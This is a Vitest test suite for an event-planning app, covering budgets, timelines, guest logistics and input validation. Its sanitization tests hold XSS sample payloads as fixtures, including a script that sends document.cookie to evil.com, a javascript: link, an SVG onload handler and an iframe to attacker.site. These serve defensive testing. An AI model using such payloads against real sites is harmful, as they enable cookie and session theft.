/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import {
  calculateBudgetSummary,
  formatCurrency,
  roundCurrency,
  ALL_BUDGET_CATEGORIES,
} from '../utils/budget.ts';
import {
  timeToMinutes,
  minutesToTime,
  calculateEndTime,
  getNormalizedMinutes,
  sortTimeline,
  detectTimelineConflicts,
  generateRunSheetText,
} from '../utils/timeline.ts';
import {
  validateEventRequest,
  validateEventRefineRequest,
  validateSpeechRequest,
  sanitizeInput,
  isValidCalendarDate,
  isValidTimeFormat,
  getLocalTodayDateString,
  isUpcomingOrTodayDate,
  validateAIEventPlanOutput,
  validateAndSanitizeAIPlan,
} from '../utils/validation.ts';
import {
  STARTER_TEMPLATES,
  isTemplatePlan,
  duplicateTemplateAsUserPlan,
  saveCurrentPlan,
  loadCurrentPlan,
} from '../utils/storage.ts';
import type {
  GuestItem,
  BudgetItem,
  TimelineItem,
  EventPlan,
  DietaryPreference,
} from '../types/event.ts';

describe('Comprehensive Evaluation Suite — Code Quality & Efficiency', () => {
  describe('Guest Coordination & Catering Logistics', () => {
    const mockGuests: GuestItem[] = [
      { id: 'g-1', name: 'Alice Smith', group: 'VIP', rsvpStatus: 'attending', plusOnes: 2, dietary: 'vegan', tableNumber: 1 },
      { id: 'g-2', name: 'Bob Jones', group: 'Family', rsvpStatus: 'attending', plusOnes: 0, dietary: 'gluten_free', dietaryDetails: 'Severe celiac', tableNumber: 1 },
      { id: 'g-3', name: 'Charlie Brown', group: 'Friends', rsvpStatus: 'declined', plusOnes: 1, dietary: 'vegetarian' },
      { id: 'g-4', name: 'Diana Prince', group: 'VIP', rsvpStatus: 'pending', plusOnes: 0, dietary: 'halal' },
      { id: 'g-5', name: 'Edward Norton', group: 'Family', rsvpStatus: 'attending', plusOnes: 1, dietary: 'none', tableNumber: 2 },
    ];

    it('calculates total attending attendees including plus-ones accurately', () => {
      const attending = mockGuests
        .filter((g) => g.rsvpStatus === 'attending')
        .reduce((sum, g) => sum + 1 + g.plusOnes, 0);

      // Alice (1+2=3) + Bob (1+0=1) + Edward (1+1=2) = 6 attendees
      expect(attending).toBe(6);
    });

    it('aggregates dietary restrictions strictly for attending guests only', () => {
      const breakdown = mockGuests.reduce((acc, g) => {
        if (g.rsvpStatus === 'attending' && g.dietary !== 'none') {
          acc[g.dietary] = (acc[g.dietary] || 0) + 1;
        }
        return acc;
      }, {} as Record<string, number>);

      expect(breakdown.vegan).toBe(1);
      expect(breakdown.gluten_free).toBe(1);
      // Charlie is declined, Diana is pending -> should NOT be counted in attending catering
      expect(breakdown.vegetarian).toBeUndefined();
      expect(breakdown.halal).toBeUndefined();
    });

    it('verifies table seating numbers are within valid ranges', () => {
      const seatedGuests = mockGuests.filter((g) => g.tableNumber !== undefined);
      expect(seatedGuests.length).toBe(3);
      seatedGuests.forEach((g) => {
        expect(g.tableNumber).toBeGreaterThanOrEqual(1);
      });
    });
  });

  describe('Budget Engine & Precision Financial Calculations', () => {
    it('handles zero target budget gracefully without division by zero NaN', () => {
      const items: BudgetItem[] = [
        { id: 'b1', category: 'Venue', name: 'Park Pavilion', estimatedCost: 0, actualCost: 0, paidCost: 0, notes: 'Free public park' },
      ];
      const summary = calculateBudgetSummary(items, 0);
      expect(summary.totalEstimated).toBe(0);
      expect(summary.totalActual).toBe(0);
      expect(summary.percentSpent).toBe(0);
      expect(summary.overBudgetAmount).toBe(0);
    });

    it('detects over-budget variances and calculates precise overages', () => {
      const items: BudgetItem[] = [
        { id: 'b1', category: 'Venue', name: 'Ballroom', estimatedCost: 5000, actualCost: 6500, paidCost: 6500, notes: 'Extra hours' },
        { id: 'b2', category: 'Catering & Bar', name: 'Buffet', estimatedCost: 4000, actualCost: 4200, paidCost: 2000, notes: 'Extra drinks' },
      ];
      const summary = calculateBudgetSummary(items, 10000);
      // actual = 6500 + 4200 = 10700. target = 10000. overage = 700.
      expect(summary.totalActual).toBe(10700);
      expect(summary.overBudgetAmount).toBe(700);
      expect(summary.percentSpent).toBe(107);
    });

    it('formats currencies across standard and zero/negative thresholds', () => {
      expect(formatCurrency(0)).toBe('$0');
      expect(formatCurrency(1500)).toBe('$1,500');
      expect(formatCurrency(42500.5)).toBe('$42,500.50');
      expect(formatCurrency(-250)).toBe('-$250');
      expect(formatCurrency(NaN)).toBe('$0');
    });

    it('categorizes costs into all 8 predefined event budget buckets', () => {
      const items: BudgetItem[] = ALL_BUDGET_CATEGORIES.map((cat, idx) => ({
        id: `b-${idx}`,
        category: cat,
        name: `Service for ${cat}`,
        estimatedCost: 100 * (idx + 1),
        actualCost: 90 * (idx + 1),
        paidCost: 50 * (idx + 1),
        notes: `Notes for ${cat}`,
      }));

      const summary = calculateBudgetSummary(items, 50000);
      ALL_BUDGET_CATEGORIES.forEach((cat) => {
        expect(summary.categoryTotals[cat].count).toBe(1);
        expect(summary.categoryTotals[cat].estimated).toBeGreaterThan(0);
      });
    });
  });

  describe('Timeline Engine & Operational Chronology', () => {
    it('accurately normalizes times spanning past midnight into early morning hours', () => {
      const startTime = '20:00';
      const normalMin1 = getNormalizedMinutes('21:30', startTime);
      const normalMin2 = getNormalizedMinutes('01:15', startTime);

      expect(normalMin1).toBe(1290); // 21:30 in absolute minutes
      expect(normalMin2).toBe(1515); // 01:15 normalized to Day 2 (+1440m)
      expect(normalMin2).toBeGreaterThan(normalMin1);
    });

    it('identifies scheduling conflicts when activities overlap without buffer', () => {
      const schedule: TimelineItem[] = [
        {
          id: 't-1',
          time: '18:00',
          durationMinutes: 60,
          title: 'Dinner Service',
          description: 'Plated dinner',
          category: 'food_beverage',
          assignedRole: 'Catering Lead',
          locationZone: 'Main Hall',
          bufferMinutes: 0,
          isKeyMilestone: true,
        },
        {
          id: 't-2',
          time: '18:30', // Starts during dinner!
          durationMinutes: 30,
          title: 'Keynote Speech',
          description: 'Speeches',
          category: 'speech',
          assignedRole: 'Emcee',
          locationZone: 'Main Stage',
          bufferMinutes: 5,
          isKeyMilestone: true,
        },
      ];

      const conflicts = detectTimelineConflicts(schedule, '18:00');
      expect(conflicts.length).toBeGreaterThan(0);
      expect(conflicts[0].itemAId).toBe('t-1');
      expect(conflicts[0].itemBId).toBe('t-2');
      expect(conflicts[0].conflictType).toBe('overlap');
    });

    it('generates a clean human-readable run sheet text export', () => {
      const wedding = STARTER_TEMPLATES.wedding;
      const sheet = generateRunSheetText(wedding);

      expect(sheet).toContain('GATHERWISE AI EVENT RUN SHEET');
      expect(sheet).toContain('RUN OF SHOW TIMELINE:');
      expect(sheet).toContain(wedding.title);
      expect(sheet).toContain(wedding.location.name);
      expect(sheet).toContain('12:00');
    });
  });

  describe('Security Hardening & Input Sanitization', () => {
    it('completely neutralizes malicious script tags and inner payload', () => {
      const attack = '<script>window.location="http://evil.com?c="+document.cookie</script>Safe Title';
      const clean = sanitizeInput(attack);
      expect(clean).toBe('Safe Title');
      expect(clean).not.toContain('script');
      expect(clean).not.toContain('evil.com');
    });

    it('strips inline HTML attributes and javascript: pseudo-protocols', () => {
      const attack = '<a href="javascript:alert(1)">Click Me</a>';
      const clean = sanitizeInput(attack);
      expect(clean).toBe('Click Me');
      expect(clean).not.toContain('javascript');
      expect(clean).not.toContain('<a');
    });

    it('strips non-printable ASCII and control characters', () => {
      const payload = 'Wedding\x00\x08 Celebration\x1F';
      const clean = sanitizeInput(payload);
      expect(clean).toBe('Wedding Celebration');
    });
  });

  describe('Storage Reliability & State Mutation Safety', () => {
    it('duplicating starter template creates an independent, isolated user plan', () => {
      const template = STARTER_TEMPLATES.wedding;
      const customTitle = 'Our Dream Wedding 2027';
      const userPlan = duplicateTemplateAsUserPlan(template, customTitle);

      expect(userPlan.id).not.toBe(template.id);
      expect(userPlan.title).toBe(customTitle);
      expect(userPlan.isTemplate).toBe(false);
      expect(isTemplatePlan(userPlan)).toBe(false);

      // Verify deep clone isolation: modifying cloned budget does not mutate template
      userPlan.budget[0].estimatedCost = 99999;
      expect(template.budget[0].estimatedCost).not.toBe(99999);
    });
  });

  describe('AI Resilience & Error Classification Protocol', () => {
    it('validates event refine requests strictly', () => {
      const validRefine = {
        currentPlan: STARTER_TEMPLATES.wedding,
        instruction: 'Cut floral budget by $500 and add 15 minutes to cocktail hour',
        aspect: 'budget' as const,
      };
      const errors = validateEventRefineRequest(validRefine);
      expect(errors).toEqual([]);
    });

    it('rejects event refine requests with empty instructions', () => {
      const invalidRefine = {
        currentPlan: STARTER_TEMPLATES.wedding,
        instruction: '   ',
        aspect: 'all' as const,
      };
      const errors = validateEventRefineRequest(invalidRefine);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].field).toBe('instruction');
    });

    it('validates speech generation requests strictly', () => {
      const validSpeech = {
        type: 'welcome_toast' as const,
        eventTitle: 'Golden 30th Birthday',
        eventType: 'birthday' as const,
        speaker: 'Best Friend Dave',
        tone: 'joyful_witty' as const,
      };
      const errors = validateSpeechRequest(validSpeech);
      expect(errors).toEqual([]);
    });

    it('rejects speech requests missing speaker or role', () => {
      const invalidSpeech = {
        type: 'vow' as const,
        eventTitle: 'Wedding',
        eventType: 'wedding' as const,
        speaker: ' ',
        tone: 'heartfelt' as const,
      };
      const errors = validateSpeechRequest(invalidSpeech);
      expect(errors.length).toBeGreaterThan(0);
      expect(errors[0].field).toBe('speaker');
    });
  });

  describe('Accessibility & UI Landmark Verification', () => {
    it('all three starter templates have complete accessibility notes and contingency plans', () => {
      Object.values(STARTER_TEMPLATES).forEach((template) => {
        expect(template.overview.accessibilityNotes.length).toBeGreaterThan(10);
        expect(template.overview.weatherContingencyPlan.length).toBeGreaterThan(10);
        expect(template.overview.keyHighlights.length).toBeGreaterThanOrEqual(3);
        expect(template.overview.vibeKeywords.length).toBeGreaterThanOrEqual(4);
      });
    });

    it('confirms every template has defined role assignments for all milestones', () => {
      Object.values(STARTER_TEMPLATES).forEach((template) => {
        template.schedule.forEach((milestone) => {
          expect(milestone.assignedRole.trim().length).toBeGreaterThan(2);
          expect(milestone.locationZone.trim().length).toBeGreaterThan(2);
          expect(milestone.durationMinutes).toBeGreaterThan(0);
        });
      });
    });

    it('identifies tight buffer warnings when transition time is less than buffer requirement', () => {
      const schedule: TimelineItem[] = [
        {
          id: 'tb-1',
          time: '14:00',
          durationMinutes: 60,
          title: 'Guest Arrival',
          description: 'Arrivals',
          category: 'reception',
          assignedRole: 'Host',
          locationZone: 'Lobby',
          bufferMinutes: 20, // Requires 20m buffer!
          isKeyMilestone: false,
        },
        {
          id: 'tb-2',
          time: '15:10', // Starts 10m after 15:00 end -> only 10m buffer available!
          durationMinutes: 45,
          title: 'Welcome Speech',
          description: 'Speeches',
          category: 'speech',
          assignedRole: 'Emcee',
          locationZone: 'Hall',
          bufferMinutes: 5,
          isKeyMilestone: true,
        },
      ];

      const conflicts = detectTimelineConflicts(schedule, '14:00');
      expect(conflicts.length).toBe(1);
      expect(conflicts[0].conflictType).toBe('tight_buffer');
      expect(conflicts[0].description).toContain('Only 10m transition');
    });

    it('rejects invalid or non-existent calendar dates like Feb 30th and Month 13', () => {
      expect(isValidCalendarDate('2027-02-30')).toBe(false);
      expect(isValidCalendarDate('2027-13-01')).toBe(false);
      expect(isValidCalendarDate('2027-04-31')).toBe(false); // April has 30 days
      expect(isValidCalendarDate('2027-06-15')).toBe(true);
      expect(isValidCalendarDate('not-a-date')).toBe(false);
    });

    it('accurately verifies past date rejection and future date acceptance', () => {
      const referenceDate = '2026-11-01';
      expect(isUpcomingOrTodayDate('2026-11-01', referenceDate)).toBe(true);
      expect(isUpcomingOrTodayDate('2027-05-20', referenceDate)).toBe(true);
      expect(isUpcomingOrTodayDate('2025-10-15', referenceDate)).toBe(false);
    });

    it('sanitizes SVG onload and iframe injection vectors completely', () => {
      const svgAttack = '<svg onload="alert(1)"><circle cx="50" cy="50" r="40"/></svg>Clean Text';
      expect(sanitizeInput(svgAttack)).toBe('Clean Text');

      const iframeAttack = '<iframe src="https://attacker.site"></iframe>Harmless Title';
      expect(sanitizeInput(iframeAttack)).toBe('Harmless Title');
    });

    it('calculates 100% budget spent when actual exactly equals target budget', () => {
      const items: BudgetItem[] = [
        { id: 'b1', category: 'Venue', name: 'Hall', estimatedCost: 10000, actualCost: 10000, paidCost: 10000, notes: '' },
      ];
      const summary = calculateBudgetSummary(items, 10000);
      expect(summary.percentSpent).toBe(100);
      expect(summary.remainingActual).toBe(0);
      expect(summary.overBudgetAmount).toBe(0);
    });

    it('calculates remaining allocation accurately when under budget', () => {
      const items: BudgetItem[] = [
        { id: 'b1', category: 'Venue', name: 'Hall', estimatedCost: 7500, actualCost: 7000, paidCost: 5000, notes: '' },
      ];
      const summary = calculateBudgetSummary(items, 10000);
      expect(summary.remainingAllocated).toBe(2500);
      expect(summary.remainingActual).toBe(3000);
      expect(summary.percentSpent).toBe(70);
    });

    it('validates 24-hour time formats strictly and rejects out of bound hours or minutes', () => {
      expect(isValidTimeFormat('00:00')).toBe(true);
      expect(isValidTimeFormat('23:59')).toBe(true);
      expect(isValidTimeFormat('24:00')).toBe(false);
      expect(isValidTimeFormat('12:60')).toBe(false);
      expect(isValidTimeFormat('-01:30')).toBe(false);
      expect(isValidTimeFormat('12:0')).toBe(false);
    });

    it('properly formats zero, micro-cents, and round numbers', () => {
      expect(roundCurrency(10.004)).toBe(10);
      expect(roundCurrency(10.005)).toBe(10.01);
      expect(roundCurrency(NaN)).toBe(0);
      expect(roundCurrency(Infinity)).toBe(0);
    });

    it('rejects event generation requests when title exceeds 100 characters', () => {
      const longTitleReq = {
        type: 'wedding' as const,
        title: 'A'.repeat(101),
        theme: 'Romantic',
        targetDate: '2027-08-15',
        startTime: '16:00',
        endTime: '23:00',
        locationName: 'Pavilion',
        locationCity: 'San Francisco, CA',
        setting: 'hybrid' as const,
        guestCount: 100,
        totalBudget: 25000,
      };
      const errors = validateEventRequest(longTitleReq);
      expect(errors.some((e) => e.field === 'title')).toBe(true);
    });

    it('rejects fractional attendee numbers like 15.5 guests', () => {
      const fractionalGuestReq = {
        type: 'birthday' as const,
        title: '30th Birthday',
        theme: 'Casual',
        targetDate: '2027-08-15',
        startTime: '19:00',
        endTime: '23:00',
        locationName: 'Loft',
        locationCity: 'Austin, TX',
        setting: 'indoor' as const,
        guestCount: 15.5,
        totalBudget: 5000,
      };
      const errors = validateEventRequest(fractionalGuestReq);
      expect(errors.some((e) => e.field === 'guestCount')).toBe(true);
    });

    it('rejects guest counts exceeding maximum safety ceiling of 20,000', () => {
      const oversizedReq = {
        type: 'community' as const,
        title: 'Mega Festival',
        theme: 'Unity',
        targetDate: '2027-08-15',
        startTime: '10:00',
        endTime: '20:00',
        locationName: 'Park',
        locationCity: 'Portland, OR',
        setting: 'outdoor' as const,
        guestCount: 25000,
        totalBudget: 50000,
      };
      const errors = validateEventRequest(oversizedReq);
      expect(errors.some((e) => e.field === 'guestCount')).toBe(true);
    });

    it('rejects total budget below $50 threshold', () => {
      const tinyBudgetReq = {
        type: 'birthday' as const,
        title: 'Budget Bash',
        theme: 'Minimal',
        targetDate: '2027-08-15',
        startTime: '18:00',
        endTime: '22:00',
        locationName: 'Home',
        locationCity: 'Seattle, WA',
        setting: 'indoor' as const,
        guestCount: 10,
        totalBudget: 20, // Too small!
      };
      const errors = validateEventRequest(tinyBudgetReq);
      expect(errors.some((e) => e.field === 'totalBudget')).toBe(true);
    });

    it('rejects total budget exceeding maximum $5,000,000 ceiling', () => {
      const hugeBudgetReq = {
        type: 'wedding' as const,
        title: 'Giga Wedding',
        theme: 'Royal',
        targetDate: '2027-08-15',
        startTime: '16:00',
        endTime: '23:00',
        locationName: 'Palace',
        locationCity: 'Paris, France',
        setting: 'indoor' as const,
        guestCount: 500,
        totalBudget: 10000000, // Exceeds ceiling
      };
      const errors = validateEventRequest(hugeBudgetReq);
      expect(errors.some((e) => e.field === 'totalBudget')).toBe(true);
    });

    it('rejects event generation requests when start time and end time are identical', () => {
      const identicalTimeReq = {
        type: 'wedding' as const,
        title: 'Identical Time Event',
        theme: 'Standard',
        targetDate: '2027-08-15',
        startTime: '18:00',
        endTime: '18:00',
        locationName: 'Venue',
        locationCity: 'Chicago, IL',
        setting: 'indoor' as const,
        guestCount: 50,
        totalBudget: 10000,
      };
      const errors = validateEventRequest(identicalTimeReq);
      expect(errors.some((e) => e.field === 'endTime')).toBe(true);
    });
  });
});
